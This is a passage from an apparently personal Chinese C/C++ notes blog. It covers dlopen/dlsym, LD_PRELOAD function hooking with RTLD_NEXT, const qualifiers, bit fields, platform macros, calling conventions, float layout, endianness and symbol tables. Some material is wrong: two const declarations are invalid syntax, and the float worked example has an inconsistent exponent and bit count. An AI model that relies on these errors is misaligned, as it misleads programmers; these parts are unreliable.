<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Setjmp code 0</span><br><span class="line">Rainbow()</span><br><span class="line">Setjmp code 47</span><br></pre></td></tr></table></figure>

<p><strong>注意事项</strong></p>
<ul>
<li>在上述实例中发现类没有被析构，这两个函数可以实现跳转但是不会检测类相关，所以类不会被析构</li>
</ul>
<h2 id="4-dlfcn-h-动态链接库"><a href="#4-dlfcn-h-动态链接库" class="headerlink" title="4. dlfcn.h 动态链接库"></a>4. dlfcn.h 动态链接库</h2><h3 id="4-1-dlopen-dlsym-dlclose-打开-加载符号-关闭-动态链接库"><a href="#4-1-dlopen-dlsym-dlclose-打开-加载符号-关闭-动态链接库" class="headerlink" title="4.1. dlopen()&#x2F;dlsym()&#x2F;dlclose() 打开&#x2F;加载符号&#x2F;关闭 动态链接库"></a>4.1. dlopen()&#x2F;dlsym()&#x2F;dlclose() 打开&#x2F;加载符号&#x2F;关闭 动态链接库</h3><p>示例用法</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 打开so库，句柄存缓存</span></span><br><span class="line">    <span class="keyword">auto</span> handler = <span class="built_in">dlopen</span>(<span class="string">&quot;./libtest.so&quot;</span>, RTLD_NOW);</span><br><span class="line">    <span class="keyword">if</span> (handler == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        <span class="built_in">LOG_WARN</span>(<span class="string">&quot;Can&#x27;t open lib &#123;&#125;&quot;</span>, <span class="string">&quot;./libtest.so&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加载函数parser</span></span><br><span class="line">    <span class="keyword">auto</span> parser = (ParserFunc)<span class="built_in">dlsym</span>(handler, <span class="string">&quot;parser&quot;</span>);</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *dlsym_error = <span class="built_in">dlerror</span>();</span><br><span class="line">    <span class="keyword">if</span> (dlsym_error) &#123;</span><br><span class="line">        <span class="built_in">dlclose</span>(handler);</span><br><span class="line">        <span class="built_in">LOG_WARN</span>(<span class="string">&quot;Cannot load symbol &#x27;parser&#x27;: &#123;&#125;&quot;</span>, dlsym_error);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用函数</span></span><br><span class="line">    (<span class="type">void</span>)<span class="built_in">parser</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">dlclose</span>(handler);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-2-加载下一个动态库符号"><a href="#4-2-加载下一个动态库符号" class="headerlink" title="4.2. 加载下一个动态库符号"></a>4.2. 加载下一个动态库符号</h3><ul>
<li>动态链接库符号查找是按照加载顺序查找的，比如有两个动态链接库有同一个<code>init()</code>函数，哪个库先加载，调用就会使用哪个库中的函数。</li>
<li>如果想要使用下一个动态库中的符号，可以使用<code>RTLD_NEXT</code>作为<code>handle</code>传入</li>
<li><strong><font color="red">使用<code>RTLD_NEXT</code>需要加编译选项<code>-D_GNU_SOURCE</code></font></strong></li>
</ul>
<p>示例</p>
<ul>
<li>使用<code>LD_PRELOAD=libtest.so xxx</code>将二进制中调用动态库的函数<code>log_init()</code>hook掉，做一些自己的操作</li>
<li>完成自己逻辑后，调回原来的函数</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief hook的库函数，log_init</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function">MYLIB_API <span class="type">int</span> <span class="title">log_init</span><span class="params">(<span class="type">int</span> pid, <span class="type">const</span> <span class="type">char</span> *szFileName)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;Hook log_init, pid %d, szFile %s&quot;</span>, pid, szFileName);</span><br><span class="line">    ...</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;call origin init&quot;</span>);</span><br><span class="line">    <span class="keyword">auto</span> origin_func = (func_logcInit)<span class="built_in">dlsym</span>(RTLD_NEXT, <span class="string">&quot;log_init&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">origin_func</span>(pid, szFileName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="5-time-h-时间处理函数"><a href="#5-time-h-时间处理函数" class="headerlink" title="5. time.h 时间处理函数"></a>5. time.h 时间处理函数</h2><h3 id="5-1-tm指针释放的问题"><a href="#5-1-tm指针释放的问题" class="headerlink" title="5.1. tm指针释放的问题"></a>5.1. tm指针释放的问题</h3><ul>
<li>tm指针在内部是一个固定的内存，每次调用都会修改此内存的值，外部不用释放</li>
<li>但是需要考虑多线程和多次调用的问题，调用之后前一次结果就无效了</li>
</ul>
<h1 id="二、语法和类型"><a href="#二、语法和类型" class="headerlink" title="二、语法和类型"></a>二、语法和类型</h1><h2 id="1-32位和64位大小区别"><a href="#1-32位和64位大小区别" class="headerlink" title="1. 32位和64位大小区别"></a>1. 32位和64位大小区别</h2><ul>
<li><code>short</code>相当于<code>short int</code></li>
<li><code>long</code>相当于<code>long int</code></li>
<li><code>size_t</code>相当于<code>unsigned long</code></li>
<li><code>long</code>和指针大小都等于编译环境的位数</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argC, <span class="type">char</span>* arg[])</span> </span>&#123;</span><br><span class="line">    <span class="comment">//32位编译</span></span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;Size of void * %d&quot;</span>, <span class="built_in">sizeof</span>(<span class="type">void</span> *));         <span class="comment">//4</span></span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;Size of float %d&quot;</span>, <span class="built_in">sizeof</span>(<span class="type">float</span>));           <span class="comment">//4</span></span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;Size of double %d&quot;</span>, <span class="built_in">sizeof</span>(<span class="type">double</span>));         <span class="comment">//8</span></span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;Size of char %d&quot;</span>, <span class="built_in">sizeof</span>(<span class="type">char</span>));             <span class="comment">//1</span></span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;Size of short %d&quot;</span>, <span class="built_in">sizeof</span>(<span class="type">short</span>));           <span class="comment">//2</span></span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;Size of int %d&quot;</span>, <span class="built_in">sizeof</span>(<span class="type">int</span>));               <span class="comment">//4</span></span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;Size of long %d&quot;</span>, <span class="built_in">sizeof</span>(<span class="type">long</span>));             <span class="comment">//4</span></span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;Size of long long %d&quot;</span>, <span class="built_in">sizeof</span>(<span class="type">long</span> <span class="type">long</span>));   <span class="comment">//8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//64位编译</span></span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;Size of void * %d&quot;</span>, <span class="built_in">sizeof</span>(<span class="type">void</span> *));         <span class="comment">//8</span></span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;Size of float %d&quot;</span>, <span class="built_in">sizeof</span>(<span class="type">float</span>));           <span class="comment">//4</span></span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;Size of double %d&quot;</span>, <span class="built_in">sizeof</span>(<span class="type">double</span>));         <span class="comment">//8</span></span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;Size of char %d&quot;</span>, <span class="built_in">sizeof</span>(<span class="type">char</span>));             <span class="comment">//1</span></span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;Size of short %d&quot;</span>, <span class="built_in">sizeof</span>(<span class="type">short</span>));           <span class="comment">//2</span></span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;Size of int %d&quot;</span>, <span class="built_in">sizeof</span>(<span class="type">int</span>));               <span class="comment">//4</span></span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;Size of long %d&quot;</span>, <span class="built_in">sizeof</span>(<span class="type">long</span>));             <span class="comment">//8</span></span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;Size of long long %d&quot;</span>, <span class="built_in">sizeof</span>(<span class="type">long</span> <span class="type">long</span>));   <span class="comment">//8</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-char-a和char-a-的区别"><a href="#2-char-a和char-a-的区别" class="headerlink" title="2. char *a和char a[]的区别"></a>2. <code>char *a</code>和<code>char a[]</code>的区别</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *a = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"><span class="type">char</span> a[] = <span class="string">&quot;Hello&quot;</span>;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th></th>
<th><code>char *a = &quot;Hello&quot;;</code></th>
<th><code>char a[] = &quot;Hello&quot;;</code></th>
</tr>
</thead>
<tbody><tr>
<td>字符串所在区域</td>
<td>常量区</td>
<td>栈</td>
</tr>
<tr>
<td>可读可写</td>
<td>常量区不可写</td>
<td>可读可写</td>
</tr>
<tr>
<td>赋值时刻</td>
<td>编译时确定</td>
<td>运行时确定</td>
</tr>
<tr>
<td>存取效率</td>
<td>属于静态存储区，较慢</td>
<td>存于栈上，较快</td>
</tr>
<tr>
<td>sizeof(a)</td>
<td>指针的大小，取决于编译环境</td>
<td>5 + 1，字符串长度加<code>&#39;\0&#39;</code></td>
</tr>
</tbody></table>
<h2 id="3-const的使用"><a href="#3-const的使用" class="headerlink" title="3. const的使用"></a>3. const的使用</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">char</span> *p;          <span class="comment">// *p是const,p可变：const 后面紧跟的是char，所以*p是一个char字符，不可变</span></span><br><span class="line"><span class="built_in">const</span> (<span class="type">char</span> *) p;       <span class="comment">// p是const, *p可变：const 后面紧跟的是（char *）这个整体，所以p是char*类型，不可变。</span></span><br><span class="line"><span class="type">char</span>* <span class="type">const</span> p;          <span class="comment">// p是const, *p可变:const 后面紧跟的是p,所以p不可变</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *<span class="type">const</span> p;    <span class="comment">// p和*p都是const：第一个const后面紧跟的是char,所以char类型的字符*p不可变；第二个const后面紧跟的是p,所以p不可变。</span></span><br><span class="line"><span class="type">char</span> <span class="type">const</span> *p;          <span class="comment">// *p是const, p可变：const后面紧跟的是*, 但是单独的*不能表明修饰的内容，所以将*p看成一个整体，所以const修饰的是*p,*p不可变。</span></span><br><span class="line">(<span class="type">char</span>*) <span class="type">const</span> p;        <span class="comment">// p是const, *p可变：const紧跟的是p,所以p不可变。</span></span><br><span class="line"><span class="type">char</span> <span class="type">const</span> *<span class="type">const</span> p;    <span class="comment">// p和*p都是const：第一个const紧跟的是*,不能表明修饰的内容，将后面整体的（* const p）看成一个整体，那就说明*p不可变，第二个const后面紧跟的是p,所以p不可变。</span></span><br></pre></td></tr></table></figure>

<h2 id="4-struct声明"><a href="#4-struct声明" class="headerlink" title="4. struct声明"></a>4. struct声明</h2><h3 id="4-1-定义位变量"><a href="#4-1-定义位变量" class="headerlink" title="4.1. 定义位变量"></a>4.1. 定义位变量</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">test_t</span> &#123;</span><br><span class="line">    <span class="type">uint16_t</span> a : <span class="number">1</span>;     <span class="comment">// 0</span></span><br><span class="line">    <span class="type">uint16_t</span> b : <span class="number">1</span>;     <span class="comment">// 1</span></span><br><span class="line">    <span class="type">uint16_t</span> c : <span class="number">1</span>;     <span class="comment">// 2</span></span><br><span class="line">    <span class="type">uint16_t</span> d : <span class="number">1</span>;     <span class="comment">// 3</span></span><br><span class="line">    <span class="type">uint16_t</span> e : <span class="number">2</span>;     <span class="comment">// 4-5</span></span><br><span class="line">    <span class="type">uint16_t</span> f : <span class="number">2</span>;     <span class="comment">// 6-7</span></span><br><span class="line">    <span class="type">uint16_t</span> g : <span class="number">2</span>;     <span class="comment">// 8-9</span></span><br><span class="line">    <span class="type">uint16_t</span> h : <span class="number">2</span>;     <span class="comment">// 10-11</span></span><br><span class="line">    <span class="type">uint16_t</span> i : <span class="number">2</span>;     <span class="comment">// 12-13</span></span><br><span class="line">    <span class="type">uint16_t</span> j : <span class="number">2</span>;     <span class="comment">// 14-15</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li>针对小端模式</li>
<li>定义在前面的是低位，即a是16位中的0位</li>
<li>但是小端模式下，低位在低地址，所以修改了a为1，则得到的是内存分布为<code>0x01</code>、<code>0x00</code>，但uint16_t打印还是<code>0x0001</code></li>
</ul>
<h2 id="5-宏定义"><a href="#5-宏定义" class="headerlink" title="5. 宏定义"></a>5. 宏定义</h2><h3 id="5-1-if宏"><a href="#5-1-if宏" class="headerlink" title="5.1. #if宏"></a>5.1. <code>#if</code>宏</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/********** ifdef形式 **********/</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> WIN32</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> WIN32</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/********** if defined形式 **********/</span></span><br><span class="line"><span class="comment">// windows或苹果</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(WIN32) || defined(__APPLE__)</span></span><br><span class="line"><span class="comment">// 要么没有定义__linux__，要么定义的__linux__为0</span></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> !defined(__linux__) || !__linux__</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<h3 id="5-2-预定义宏"><a href="#5-2-预定义宏" class="headerlink" title="5.2. 预定义宏"></a>5.2. 预定义宏</h3><h4 id="1-平台相关"><a href="#1-平台相关" class="headerlink" title="1) 平台相关"></a>1) 平台相关</h4><h5 id="1-windows"><a href="#1-windows" class="headerlink" title="(1) windows"></a>(1) windows</h5><ul>
<li><code>WIN32</code>: 由头文件<code>minwindef.h</code>定义，一般是判断是否有调用windowsapi</li>
<li><code>_WIN32</code>: 32位和64位程序都有，由编译器指定</li>
<li><code>_WIN64</code>: 只有64位程序才有，由编译器指定</li>
</ul>
<h5 id="2-linux"><a href="#2-linux" class="headerlink" title="(2) linux"></a>(2) linux</h5><ul>
<li>gcc定义了下面的几个宏</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; gcc -dM -E - &lt; /dev/null | grep -i linux</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define __linux 1</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define __gnu_linux__ 1</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define linux 1</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define __linux__ 1</span></span><br><span class="line">=&gt; gcc -dM -E - &lt; /dev/null | grep -i unix</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define __unix 1</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define __unix__ 1</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define unix 1</span></span><br></pre></td></tr></table></figure>

<ul>
<li>clang定义</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; clang -dM -E -x c /dev/null | grep -i linux</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define __gnu_linux__ 1</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define __linux 1</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define __linux__ 1</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define linux 1</span></span><br><span class="line">=&gt; clang -dM -E -x c /dev/null | grep -i unix</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define __unix 1</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define __unix__ 1</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define unix 1</span></span><br></pre></td></tr></table></figure>

<h5 id="通用写法"><a href="#通用写法" class="headerlink" title="通用写法"></a>通用写法</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> defined(_WIN32) || defined(WIN32)</span></span><br><span class="line">   <span class="comment">//define something for Windows (32-bit and 64-bit, this part is common)</span></span><br><span class="line">    <span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line">        <span class="comment">//define something for Windows (64-bit only)</span></span><br><span class="line">    <span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">        <span class="comment">// 32-bit only</span></span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> __APPLE__</span></span><br><span class="line">    <span class="meta">#<span class="keyword">if</span> TARGET_IPHONE_SIMULATOR</span></span><br><span class="line">         <span class="comment">// iOS Simulator</span></span><br><span class="line">    <span class="meta">#<span class="keyword">elif</span> TARGET_OS_IPHONE</span></span><br><span class="line">        <span class="comment">// iOS device</span></span><br><span class="line">    <span class="meta">#<span class="keyword">elif</span> TARGET_OS_MAC</span></span><br><span class="line">        <span class="comment">// Other kinds of Mac OS</span></span><br><span class="line">    <span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">        <span class="comment">// Unsupported platform</span></span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> __linux__</span></span><br><span class="line">    <span class="comment">// linux</span></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> __unix <span class="comment">// all unix not caught above</span></span></span><br><span class="line">    <span class="comment">// Unix</span></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> __posix</span></span><br><span class="line">    <span class="comment">// POSIX</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<h4 id="2-编译相关"><a href="#2-编译相关" class="headerlink" title="2) 编译相关"></a>2) 编译相关</h4><h5 id="1-stdcall-cdecl-fastcall-pascal"><a href="#1-stdcall-cdecl-fastcall-pascal" class="headerlink" title="(1) __stdcall&#x2F;__cdecl&#x2F;__fastcall&#x2F;__pascal"></a>(1) <code>__stdcall</code>&#x2F;<code>__cdecl</code>&#x2F;<code>__fastcall</code>&#x2F;<code>__pascal</code></h5><table>
<thead>
<tr>
<th></th>
<th><code>__stdcall</code></th>
<th><code>__cdecl</code></th>
<th><code>__fastcall</code></th>
<th><code>__pascal</code></th>
</tr>
</thead>
<tbody><tr>
<td>参数压栈顺序</td>
<td>从右到左</td>
<td>从右到左</td>
<td>左边两个大小不大于4个字节（DWORD）的参数放在ECX和EDX寄存器，其余的参数从右到左</td>
<td>从左到右</td>
</tr>
<tr>
<td>栈清理方</td>
<td>被调用的函数</td>
<td>调用函数</td>
<td>被调用的函数</td>
<td>被调用的函数</td>
</tr>
<tr>
<td>函数名</td>
<td>前缀<code>_</code>，名称后跟<code>@</code>和参数列表字节数的十进制<br><code>int func(int a, double b)</code> &#x3D;&gt; <code>_func@12</code></td>
<td>前缀<code>_</code></td>
<td>前缀<code>@</code>，名称后跟<code>@</code>和参数列表字节数的十进制<br><code>int func(int a, double b)</code> &#x3D;&gt; <code>@func@12</code></td>
<td>函数名全部大写</td>
</tr>
<tr>
<td>备注</td>
<td>winapi使用，一般自清理堆栈是减少调用者大小</td>
<td>C&#x2F;C++默认调用方式，由于外部清理，一般作为可变参数函数使用</td>
<td>前两个参数放入寄存器，更快调用，一般给参数很少的函数使用</td>
<td>使用<code>__stdcall</code>代替</td>
</tr>
</tbody></table>
<h2 id="6-static和inline"><a href="#6-static和inline" class="headerlink" title="6. static和inline"></a>6. static和inline</h2><ul>
<li>static代表声明函数作用域，函数声明成static，将会仅在一个c文件生效，不会生成符号，外部不可调用</li>
<li>inline是类似宏的形式，建议编译器将其在调用处展开，但是仅有建议，是否真正当作inline还是看编译器分析结果<ul>
<li>如果函数过长或者存在递归等，就不会展开，仅会当作正常函数编译，还会生成符号，除非添加static</li>
</ul>
</li>
</ul>
<h2 id="7-volatile"><a href="#7-volatile" class="headerlink" title="7. volatile"></a>7. volatile</h2><ul>
<li>编译器会对某些变量优化，可能存在将变量读入寄存器后，之后取值直接从寄存器取</li>
<li>使用volatile要求编译器对变量的取值每次都从内存中取，不要使用cpu缓存</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">val1 = x;</span><br><span class="line">val2 = x;</span><br></pre></td></tr></table></figure>

<ul>
<li>如上面的实例，如果x没有被设置volatile，val2的赋值会被编译器优化成从寄存器取值，如果其他地方在val1赋值之后修改了值，val2拿不到修改后的值</li>
</ul>
<h2 id="8-register"><a href="#8-register" class="headerlink" title="8. register"></a>8. register</h2><ul>
<li>函数内使用，将变量存放到cpu寄存器中，不需要存放到内存，用于加快速度，和上面的volatile对应</li>
<li>对register变量无法取地址，因为此变量在cpu寄存器中，会随时被更改</li>
</ul>
<h2 id="9-数组"><a href="#9-数组" class="headerlink" title="9. 数组"></a>9. 数组</h2><h3 id="9-1-数组的地址"><a href="#9-1-数组的地址" class="headerlink" title="9.1. 数组的地址"></a>9.1. 数组的地址</h3><ul>
<li>数组是一种类型，对数组取地址，仅仅是1级指针，指向数组这个类型，实际值和数组首地址一样，但是类型不一样</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> arr[<span class="number">5</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line"><span class="keyword">auto</span> a = arr;       <span class="comment">// int *</span></span><br><span class="line"><span class="keyword">auto</span> b = &amp;arr;      <span class="comment">// int (*)[5]</span></span><br><span class="line"><span class="keyword">auto</span> c = &amp;a;        <span class="comment">// int **</span></span><br><span class="line">std::cout &lt;&lt; ((<span class="type">void</span> *)a == (<span class="type">void</span> *)b) &lt;&lt; std::endl;     <span class="comment">// 1</span></span><br><span class="line">std::cout &lt;&lt; ((<span class="type">void</span> *)a == (<span class="type">void</span> *)c) &lt;&lt; std::endl;     <span class="comment">// 0</span></span><br></pre></td></tr></table></figure>

<h2 id="10-float"><a href="#10-float" class="headerlink" title="10. float"></a>10. float</h2><h3 id="10-1-组成和计算"><a href="#10-1-组成和计算" class="headerlink" title="10.1. 组成和计算"></a>10.1. 组成和计算</h3><ul>
<li>float一共占用4个字节32位，1位符号位，8位二进制指数位，23位尾数</li>
<li>转换过程是将数字转成二进制的带小数点的科学记数法，如</li>
</ul>
<p>$$ 8.25 &#x3D; 33 \times 2^{-2} &#x3D; 100001 \times 2^{-2} &#x3D; 1.00001 \times 2^3 $$</p>
<p>$$ 8.25 &#x3D; 8 + 0.25 &#x3D; 1000 + 0.01 &#x3D; 1000.01 \times 2^3 $$</p>
<ul>
<li>小数点前面永远是1，所以直接省略掉，只取00001放到后面23位尾数内</li>
<li>指数为5，由于8位可以表示<code>-127 ~ 128</code>，为了统一就直接取0为127，那么5就是 $127 + 3 &#x3D; 130 &#x3D; 0b10000010$</li>
<li>前面符号位为0，正数，所以8.25的float为 <code>0 10000010 000010000000000000000000</code></li>
</ul>
<h2 id="11-double"><a href="#11-double" class="headerlink" title="11. double"></a>11. double</h2><h3 id="11-1-组成"><a href="#11-1-组成" class="headerlink" title="11.1. 组成"></a>11.1. 组成</h3><ul>
<li>计算参考float</li>
<li>double占用8个字节64位，1位符号位，11位指数位，52位尾数</li>
</ul>
<h1 id="三、系统相关"><a href="#三、系统相关" class="headerlink" title="三、系统相关"></a>三、系统相关</h1><h2 id="1-大小端"><a href="#1-大小端" class="headerlink" title="1. 大小端"></a>1. 大小端</h2><h3 id="1-1-大小端出现的原因"><a href="#1-1-大小端出现的原因" class="headerlink" title="1.1. 大小端出现的原因"></a>1.1. 大小端出现的原因</h3><ul>
<li>对于16位、32位、64位等寄存器，由于人们的读取习惯为从左向右，但是数字又是右边是低位，左边是高位，所以出现了不同硬件厂商定义了不同的结构模式</li>
</ul>
<h3 id="1-2-大小端定义详解"><a href="#1-2-大小端定义详解" class="headerlink" title="1.2. 大小端定义详解"></a>1.2. 大小端定义详解</h3><ul>
<li>比如<code>0x1234</code>，<code>0x12</code>是高8位，<code>0x34</code>是低8位</li>
<li>计算机需要从低地址数字低位开始读取，数字从小到大，<code>0x34</code>、<code>0x12</code>，x86和大部分arm架构都是小端模式</li>
<li>人们却习惯从高位开始读，所以读成<code>0x12</code>、<code>0x34</code>，网络字节序定义为大端模式</li>
</ul>
<table>
<thead>
<tr>
<th></th>
<th>0x000000</th>
<th>0x000001</th>
</tr>
</thead>
<tbody><tr>
<td>大端</td>
<td>0x12</td>
<td>0x34</td>
</tr>
<tr>
<td>小端</td>
<td>0x34</td>
<td>0x12</td>
</tr>
</tbody></table>
<h1 id="四、其他"><a href="#四、其他" class="headerlink" title="四、其他"></a>四、其他</h1><h2 id="1-exit和return"><a href="#1-exit和return" class="headerlink" title="1. exit和return"></a>1. exit和return</h2><ul>
<li>exit用于在程序运行的过程中随时结束程序，exit的参数是返回给OS的。main函数结束时也会隐式地调用exit函数。exit函数运行时首先会执行由atexit()函数登记的函数，然后会做一些自身的清理工作，同时刷新所有输出流、关闭所有打开的流并且关闭通过标准I&#x2F;O函数tmpfile()创建的临时文件。exit是结束一个进程，它将删除进程使用的内存空间，同时把错误信息返回父进程；而return是返回函数值并退出函数。通常情况：exit(0)表示程序正常, exit(1)和exit(-1)表示程序异常退出，exit(2)表示表示系统找不到指定的文件。在整个程序中，只要调用exit就结束（当前进程或者在main时候为整个程序）。</li>
<li>return是语言级别的，它表示了调用堆栈的返回；return( )是当前函数返回，当然如果是在主函数main, 自然也就结束当前了，如果不是，那就是退回上一层调用。在多个进程时。如果有时要检测上个进程是否正常退出。就要用到上个进程的返回值，依次类推。而exit是系统调用级别的，它表示了一个<strong>进程</strong>的结束。</li>
<li>exit函数是退出应用程序，并将应用程序的一个状态返回给OS，这个状态标识了应用程序的一些运行信息。</li>
<li>和机器和操作系统有关的一般是： 0为正常退出，非0为非正常退出；</li>
<li>exit()头文件为<code>#include &lt;stdlib.h&gt;</code></li>
</ul>
<h2 id="2-二进制符号"><a href="#2-二进制符号" class="headerlink" title="2. 二进制符号"></a>2. 二进制符号</h2><h3 id="2-1-查看符号"><a href="#2-1-查看符号" class="headerlink" title="2.1. 查看符号"></a>2.1. 查看符号</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">导出二进制符号表</span></span><br><span class="line">readelf -Ws xxx &gt; xxx.elf</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">导出汇编指令表</span></span><br><span class="line">objdump -DS xxx &gt; xxx.obj</span><br></pre></td></tr></table></figure>

<ul>
<li>符号表中LOCAL代表本地符号，外部不可用。调用也会调用自己的函数，不可被普通hook</li>
<li>GLOBAL代表导出的符号，可以给外部调用。内部调用也是按照so库加载顺序调用，即可以被hook</li>
</ul>
<h3 id="2-2-extern-“C”-作用"><a href="#2-2-extern-“C”-作用" class="headerlink" title="2.2. extern “C” 作用"></a>2.2. extern “C” 作用</h3><ul>
<li>一般这个标记是用来标识C++中导出的C函数，但是在符号表中的效果却不一样</li>
</ul>
<p><code>Logc_init</code>函数没有加<code>extern &quot;C&quot;</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">    70: 00000000000037c1    78 FUNC    GLOBAL DEFAULT   11 subhook_free</span><br><span class="line">    71: 0000000000001c90   151 FUNC    GLOBAL DEFAULT   11 _Z9Logc_initiPKc</span><br><span class="line">    72: 0000000000002ed1    75 FUNC    GLOBAL DEFAULT   11 subhook_alloc_code</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p><code>Logc_init</code>函数加<code>extern &quot;C&quot;</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">    75: 000000000000386b    95 FUNC    GLOBAL DEFAULT   11 subhook_remove</span><br><span class="line">    76: 0000000000001c80   151 FUNC    GLOBAL DEFAULT   11 Logc_init</span><br><span class="line">    77: 0000000000002e74    77 FUNC    GLOBAL DEFAULT   11 subhook_unprotect</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<ul>
